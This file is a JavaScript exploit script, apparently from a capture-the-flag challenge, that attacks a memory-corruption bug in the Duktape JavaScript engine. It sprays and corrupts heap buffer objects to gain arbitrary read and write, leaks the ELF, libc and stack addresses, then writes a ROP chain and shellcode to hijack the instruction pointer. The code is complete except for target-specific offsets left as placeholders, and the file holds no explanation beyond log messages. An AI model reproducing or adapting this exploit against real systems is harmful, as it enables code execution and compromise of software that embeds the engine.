
/* PWN FUNCTION */
var spray = [];
var targets = [];
var pad = [];
var save = [];

var pwn = new function()
{
	/* exploit settings */
	this.debug_level = 3;	
	this.arch_ptr_size = 8;
	this.defrag_heap_rounds = 10;
	this.spray_rounds = 6;
	this.corrupt_len = 31337;
	this.next_walk = 1
	this.prev_walk = 2

	this.duk_hbufobj_magic = i2d(0x00000001e8002081);
	this.duk_hbufobj_u32_magic = i2d(0x000000001b0002081);
	this.duk_hbuffer_magic = i2d(0x0000000100000002); //0x000055902413cb70     02 00 00 00 01 00 00 00
	this.native_func_magic = i2d(0x0000000118075281); //0x000055902411fde0  81 52 07 18 01 00 00 00
	this.sc_ctx_buf_size = i2d(0x00269000000000); // 00 00 00 00 90 26 00 00
	this.sc_buf_size = i2d(0x000004d200000000); // 00 00 00 00 90 26 00 00
	this.compiled_func_magic = i2d(0x18040b81);
	this.corrupt_size = i2d(0x00007a6900000000);
	this.elf_marker = i2d(0x00010102464c457f); //0x00005625100af000     7f 45 4c 46 02 01 01 00     .ELF...........
	this.end_magic = i2d(0x0);
	this.native_func = undefined;
	/* env specific settings */
	this.hobj = undefined; /* hbufobj->fake_duk_hbuffer */
	this.hbuf_obj = undefined; /* fake duk_hbuffer */
	this.buf_offset = undefined;
	this.prev_ptr = undefined;
	this.next_ptr = undefined;
	this.hbuffer_ptr = undefined;
	this.shellcode_ctx = undefined;
	this.shellcode = undefined

	this.got_offset = _REPLACE_GOT_TARGET_; 		/* got.free() */
	this.libc_offset = _REPLACE_LIBC_TARGET_; 		/* libc.free() */
	this.elf_offset = _REPLACE_PERFORMANCE_NOW_TARGET_;
	this.environ = _REPLACE_ENVIRON_TARGET_;
	this.stack_target = _REPLACE_STACK_TARGET_;
	this.stack_target_2 = _REPLACE_STACK2_TARGET_;
	this.rop = _REPLACE_ROPCHAIN_TARGET_;
	this.scode = _REPLACE_SC_TARGET_;
	this.scode_len = _REPLACE_SC_LEN_TARGET_;
	this.stack_offset = _REPLACE_STACK_OFFSET_TARGET_;
	this.god_gadget = _REPLACE_GOD_GADGET_TARGET_;
	this.rop_chain = [];

	this.stack = undefined;
	this.stack2 = undefined;
	this.libc = undefined;
	this.elf = undefined;
	this.native_func_offset = 0x38;

	this.set_ctx = function() {
		log("[+] pwn context initialized - macht mit musik!");
		/* create fake duk_hbuffer object */
		//log(Duktape.info(this.hobj));
		//this.hbuf_obj[this.buf_offset+1] = i2d(0x0); /* null linked list */
		//this.hbuf_obj[this.buf_offset+2] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset+4] = i2d(0xdeadbeef); /* target_addr */
		this.hbuf_obj[this.buf_offset+5] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset] = i2d(0x0000222200000081); /* set magic to 81 (dynamic/external) and refcount to 2 */

	};

	this.reset_ctx = function() {
		/* create fake duk_hbuffer object */

		this.hbuf_obj[this.buf_offset+4] = i2d(0x0); /* target_addr */
		this.hbuf_obj[this.buf_offset+5] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset] = i2d(0x0); /* set magic to 81 (dynamic/external) and refcount to 2 */
		Duktape.gc();
		//this.hbuf_obj[this.buf_offset+1] = i2d(0x0); /* null linked list */
		//this.hbuf_obj[this.buf_offset+2] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset+4] = i2d(0xdeadbeef); /* target_addr */
		this.hbuf_obj[this.buf_offset+5] = i2d(0x0); /* null linked list */
		this.hbuf_obj[this.buf_offset] = i2d(0x0000222200000081); /* set magic to 81 (dynamic/external) and refcount to 2 */
	};

	this.set_addri = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = addr.asDouble(); /* target_addr */
	}

	this.set_addr = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = i2d(0xdeadbeef); /* target_addr */
	}	

	this.set_addr_raw = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = addr; /* target_addr */
	}	

	this.read64_idx = function(idx) {
		return this.hobj[idx];
	}	

	this.write64_idx = function(idx, val) {
		this.hobj[idx] = i2d(val);
	}	

	this.read64i = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = addr.asDouble();
		return d2i(this.hobj[0]);
	};

	this.read64 = function(addr) {
		this.hbuf_obj[this.buf_offset+4] = i2d(addr);
		return d2i(this.hobj[0]);
	};

	this.write64i = function(addr, val) {
		this.hbuf_obj[this.buf_offset+4] = addr.asDouble();
		this.hobj[0] = i2d(val);
	};

	this.write64d = function(addr, val) {
		this.hbuf_obj[this.buf_offset+4] = addr.asDouble();
		this.hobj[0] = val.asDouble();
	};

	this.write64 = function(addr, val) {
		this.hbuf_obj[this.buf_offset+4] = addr;
		this.hobj[0] = val;
	};

	this.find_elf = function(addr) {
		addr = d2i(addr);
		addr.assignSub(addr, this.elf_offset);
		res = this.read64i(addr);
		if(res.asDouble() == this.elf_marker)
		{
			console.log("[+] Found ELF base at: " + addr);
			return addr;
		}
		return 0;
	};
	
	this.leak_libc = function(addr) {
		addr = this.find_native_func(addr);
		if(addr)
			elf_base = this.find_elf(addr);
		if(elf_base)
		{
			this.elf = d2i(elf_base.asDouble());
			elf_base.assignAdd(elf_base, this.got_offset);
			this.libc = this.read64i(elf_base) 
			this.libc.assignSub(this.libc, this.libc_offset);
			log("[+] Found libc base: " + this.libc);
			this.rebase();
			return this.libc;
		}
		return 0;
	};

	this.rebase = function() {
		/* rebase target pointers with libc-base */
		this.environ = h2i(this.environ);
		this.god_gadget = h2i(this.god_gadget)
		this.environ.assignAdd(this.environ, this.libc);
		this.god_gadget.assignAdd(this.god_gadget, this.libc);

		this.stack_target = h2i(this.stack_target);
		this.stack_target.assignAdd(this.stack_target, this.elf);
		this.stack_target_2 = h2i(this.stack_target_2);
		this.stack_target_2.assignAdd(this.stack_target_2, this.elf);
		log("[+] Environ addr: " + this.environ);
		log("[+] Stack-target addr: " + this.stack_target);
		log("[+] Stack-target 2 addr: " + this.stack_target_2);
		log("[+] God-gadget addr: " + this.god_gadget);
		return 0;
	};

	this.leak_stack = function() {
		this.stack = this.read64i(this.environ);
		// get another
		this.stack2 = this.read64i(this.environ);
		this.stack2.assignSub(this.stack2, this.stack_offset);
		log("[+] Stack-MAIN-target: " + this.stack2);
		log("[+] Stack base-addr: " + this.stack);
	}

	this.setup_shellcode = function() {
		this.sc_ctx = new Float64Array(1234);
		this.sc = new Uint8Array(1234);

		var sc_ctx_ptr = d2i(this.find_buf(this.next_ptr, this.duk_hbufobj_magic, this.sc_ctx_buf_size, this.next_walk));
		if(sc_ctx_ptr.asDouble() == 0) {
			log("[*] Looking in back buf")
			sc_ctx_ptr = d2i(this.find_buf(this.prev_ptr, this.duk_hbufobj_magic, this.sc_ctx_buf_size, this.prev_walk));
		}
		var sc_ptr = d2i(this.find_buf(this.next_ptr, this.duk_hbufobj_u32_magic, this.sc_buf_size, this.next_walk));
		if(sc_ptr.asDouble() == 0) {
			log("[*] Looking in back buf")
			sc_ptr = d2i(this.find_buf(this.prev_ptr, this.duk_hbufobj_u32_magic, this.sc_buf_size, this.prev_walk));
		}

		log("[+] Shellcode buffer: " + sc_ctx_ptr);
		log("[+] Shellcode buffer: " + sc_ptr);
		this.shellcode_ctx = Add(sc_ctx_ptr, 0x20);
		this.shellcode = Add(sc_ptr, 0x20);
		log("[*] Shellcode ctx: " + this.shellcode_ctx);
		log("[*] Shellcode: " + this.shellcode);

		target =  this.stack_target_2.asDouble();
		/* setup shellcode context*/
		this.sc_ctx[0] = this.shellcode_ctx.asDouble();
		this.sc_ctx[1] = this.stack2.asDouble();
		this.sc_ctx[2] = this.god_gadget.asDouble();
		/* setup shellcode */

		for(wyff = 0; wyff < this.scode_len; wyff++) {
			this.sc[wyff] = this.scode[wyff];
		}
	}

	this.setup_rop = function() {
		/* rebase ROP pointers with libc-base */
		for(yaff = 0; yaff < this.rop.length; yaff++) {
			if(this.rop[yaff] == 0xcaf3beef) {
				this.rop_chain.push(this.shellcode);
				continue;
			}
			if(this.rop[yaff] == 0xac1dbeef) {
				this.rop_chain.push(this.shellcode_ctx);
				continue;
			}
			if(this.rop[yaff] - 0x1000000000 > 0) {
				var g = h2i(this.rop[yaff]);
				g.assignSub(g, 0x1000000000);
				g.assignAdd(g, this.libc);
				this.rop_chain.push(g);
			} else {
				this.rop_chain.push(h2i(this.rop[yaff]));
			}
		}

		target =  this.stack_target.asDouble();
		for(ayy = 0; ayy < 0x1000; ayy++) {
			this.set_addri(this.stack);
			if(this.hobj[0] == target) {
				log("[+] Found stack-hijack at: " + this.stack);
				log("[*] Writing ROP-chain to stack!");
				for(fooz = 0; fooz < this.rop_chain.length; fooz++)
				{
					this.write64d(this.stack, this.rop_chain[fooz]);
					this.stack.assignAdd(this.stack, 8);
				}
				return 0;
			}
			this.stack.assignSub(this.stack, 8);
		}
		log("Failed to find stack-hijack!");
		return 0;
	};

	this.to_arch_size = function(val) {
		var arch_ptr = 8;
		return val / arch_ptr;
	}

	/* find duk_hnatfunc */
	this.find_native_func = function(addr) {
		log("[*] Looking for native duktape function ...");
		addr = this.walk(addr, this.native_func_magic, 1, 0);
		this.native_func = addr;
		this.set_addr_raw(addr);
		addr = this.read64_idx(this.to_arch_size(this.native_func_offset)); /* +0x38 - duk_hnatfunc->func */
		if(pwn.debug_level >= 3)
			log("[+] Leaked native func: " + d2i(addr));
		return addr;
	};

	this.call = function() {
		log("[+] OK gogo!");
		performance.now();		
	}

	this.set_rip = function(addr, val) {
		log("[*] Setting RIP to: " + hexu(val));
		this.set_addr_raw(addr);
		this.write64_idx(this.to_arch_size(this.native_func_offset), val); /* +0x38 - duk_hnatfunc->func */	
	}

	this.find_val = function(arr, needle) {
		for(i = 0; i < arr.length; i++)
		{
			if(arr[i] == needle)
				return true;
		}
		return false;
	};

	/* walk the duk_heaphdr linked list */
	this.walk = function(addr, needle, direction, next) 
	{
		orig =  addr.asDouble();
		curr = undefined;
		this.set_addri(addr);

		if(direction == this.next_walk)
			log("[*] Walking duk_heaphdr->next linked-list");
		else
			log("[*] Walking duk_heaphdr->prev linked-list");
		if(next) {
			this.set_addri(d2i(this.hobj[direction]));
		}

		do 
		{
			if(this.debug_level >= 4) {
				log("flags " + d2i(this.hobj[0]));
				log("duk_heaphdr->direction " + d2i(curr));
			}
			if(this.hobj[0] == needle) {
				if(this.debug_level >= 2)
					log("[+] Found needle: " + d2i(curr));
				return curr;
			}
			curr = this.hobj[direction];
			this.set_addr_raw(this.hobj[direction]);
		} while(this.hobj[direction] != pwn.end_magic && this.hobj[direction] != orig);
		log("[*] Walk completed ...");
		return 0;
	};

	this.find_buf = function(addr, needle, size, direction) 
	{
		orig =  addr.asDouble();
		curr = undefined;
		this.set_addri(addr);

		if(direction == this.prev_walk)
			log("[*] Walking duk_heaphdr->next linked-list");
		else
			log("[*] Walking duk_heaphdr->prev linked-list");

		do 
		{
			if(this.debug_level >= 4) {
				log("flags " + d2i(this.hobj[0]));
				log("duk_heaphdr->direction " + d2i(curr));
			}

			if(this.hobj[0] == needle) {
				if(this.debug_level >= 4) {
				log("[+] Found needle: " + d2i(curr));
				log("[+] Found size: " + d2i(this.hobj[9]));
				log("[+] Found buf: " + d2i(this.hobj[7]));
				}
				if(this.hobj[9] == size) {
					log("[+] Found needle: " + d2i(curr));
					return this.hobj[7];
				}
			}
			curr = this.hobj[direction];
			this.set_addr_raw(this.hobj[direction]);
		} while(this.hobj[direction] != pwn.end_magic && this.hobj[direction] != orig);
		log("[*] Walk completed ...");
		return 0;
	};
}

/* EXPLOITATION */
function exploit() {
	var hobj_idx = undefined;
	var hobj_offset = undefined;
	var hbuffer_offset = undefined;
	var found = 0;

	/* defrag the heap */
	for(i = 0; i < pwn.defrag_heap_rounds; i++) {
		f = new Float64Array(4);f[0] = 1111.4444;f[1] = 2222.5555;
		pad.push(f);
	}

	/* spray duk_hbufobj and duk_hbuffer objects via Float64Arrays*/
	for(i = 0; i < pwn.spray_rounds; i++) {
		var p = new Float64Array(4);p[0]=1337.0;p[1]=4445.0;
		p.sect(); /* trigger vuln */
		spray.push(p);
		var q = new Float64Array(200);q[0]=6661.6661;q[1]=1116.1116;
		targets.push(q);
	}
	
	/* find sprayed duk_hbufobj in the heap */
	for (i = 0; i < pwn.spray_rounds; i++) 
	{
		for(j = 0; j < pwn.corrupt_len; j++) 
		{
			if(spray[i][j] == pwn.duk_hbufobj_magic && spray[i][j+9] == pwn.corrupt_size)
			{
				hobj_idx = i;
				hobj_offset = j;
				found = 1;
				break;
			}
		}
		if(found)
			break;
	}

	if(!found){
		log("[-] Exploit failed ...");
		return;
	}

	/* save duk_hbufobj values */
	pwn.next_ptr = d2i(spray[hobj_idx][hobj_offset+1]);
	pwn.prev_ptr = d2i(spray[hobj_idx][hobj_offset+2]);
	pwn.hbuffer_ptr = d2i(spray[hobj_idx][hobj_offset+7]);
	if(pwn.debug_level >= 2) {
		log("[*] hbufojb->next: " + pwn.next_ptr.toString());
		log("[*] hbufojb->prev: " + pwn.prev_ptr.toString());
		log("[*] hbufojb->hbuffer: " + pwn.hbuffer_ptr.toString());
	}

	/* find duk_hbuffer in memory */
	for (i = 0; i < pwn.corrupt_len; i++) {	
		if(spray[hobj_idx][i] == pwn.duk_hbuffer_magic && 
			spray[hobj_idx][i+4] == 6661.6661 && 
			spray[hobj_idx][i+5] == 1116.1116) {
			hbuffer_offset = i;
			hbuffer_data_offset = i + 4;
			break;
		}
	}

	/* find duk_hbufobj pointing to our duk_hbuffer in memory  */
	spray[hobj_idx][hbuffer_offset+4] = 1337.7331;
	for(i = 0; i < pwn.spray_rounds; i++) {
		if(targets[i][0] == 1337.7331) {
			pwn.hobj = targets[i];
			pwn.hbuf_obj = spray[hobj_idx];
			pwn.buf_offset = hbuffer_offset;
			break;
		}
	}

	if(pwn.hobj == 0 || pwn.hbuf_obj == 0 || pwn.buf_offset == 0) {
		log("[-] Exploit failed ...")
		return;
	}

	pwn.set_ctx();
	// gc-trick to avoid potential crash, null object and trigger gc, then restore object and our corruption
	pwn.reset_ctx();
	pwn.leak_libc(pwn.next_ptr);
	pwn.leak_stack();
	pwn.setup_shellcode();
	pwn.setup_rop();
	console.log("[*] ROP-O-CLOCK!");
}
exploit();

